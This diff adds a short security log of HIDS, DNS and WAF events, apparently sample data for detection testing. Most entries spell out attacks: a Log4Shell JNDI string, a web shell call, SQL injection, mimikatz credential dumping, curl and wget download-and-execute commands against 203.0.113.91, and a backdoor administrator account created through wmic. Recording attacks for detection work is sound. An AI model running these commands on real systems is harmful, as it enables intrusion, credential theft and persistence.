@@ -1,0 +1,12 @@
+2026-06-02 09:11:20 [hids] HID0301001 wmic /node:10.20.7.88 process call create "cmd.exe /c whoami"
+2026-06-02 09:12:05 [dns] DNS0302100 3fa2b9c1.xkqwvp-9d2f.net A 203.0.113.77
+2026-06-02 09:15:40 [waf] WAF0303110 /api/v1/info?token=${jndi:rmi://192.0.2.44:1099/exp}
+2026-06-02 09:20:33 [waf] WAF0303221 /uploads/shell.jsp?cmd=id
+2026-06-02 09:22:11 [waf] WAF0303304 POST /api/v2/render deserialization=rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0
+2026-06-02 09:25:02 [waf] WAF0303412 GET /api/v2/search?q=admin' AND (SELECT sleep(5))--
+2026-06-02 09:30:18 [hids] HID0303555 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+2026-06-02 09:33:44 [hids] HID0303601 curl -s http://203.0.113.91/x.sh -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x && crontab -l > /tmp/cron.bak
+2026-06-02 09:35:12 [hids] HID0303702 wmic /node:10.20.7.99 process call create "cmd.exe /c whoami && net user /add service 0xPassw0rd! && net localgroup administrators service /add"
+2026-06-02 09:40:55 [hids] HID0303800 systemctl restart nginx && systemctl status nginx
+2026-06-02 09:42:30 [dns] DNS0303900 www.example.org A 10.10.20.5
+2026-06-02 09:50:07 [waf] WAF0304010 POST /containers/9f3a2b1c/exec HTTP/1.1 {"Cmd":["/bin/sh","-c","wget -q http://203.0.113.91/b -O /tmp/.b && chmod +x /tmp/.b && /tmp/.b"]}
